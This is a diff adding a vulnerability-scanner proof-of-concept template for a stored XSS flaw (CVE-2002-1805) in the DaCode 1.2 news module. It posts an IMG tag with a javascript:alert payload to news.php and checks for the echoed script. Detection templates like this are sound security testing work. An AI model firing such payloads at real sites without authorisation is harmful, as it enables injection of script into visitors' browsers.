@@ -1,0 +1,35 @@
+[info]
+author = "ave"
+description = "验证 DaCode 1.2 新闻消息模块是否存在 HTML 注入（XSS）漏洞。通过向新闻发布表单提交包含 JavaScript 的 IMG 标签载荷，检测服务端是否对用户输入进行充分过滤。若过滤不当，恶意脚本将在浏览该新闻页面的用户浏览器中执行。"
+id = "POC-AVE-2002-0684"
+name = "DaCode 1.2 News Message HTML Injection PoC"
+severity = "medium"
+tags = ["ave-2002-0684"]
+vuln_id = [
+    "CVE-2002-1805",
+    "AVE-2002-0684",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+content_type = "application/x-www-form-urlencoded"
+method = "POST"
+path = "/{{BaseURL}}/news.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "title=AVEXSS&message=<IMG+SRC%3D%22javascript:alert('AVEPoC')%22>&submit=Submit"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["javascript:alert('AVEPoC')"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
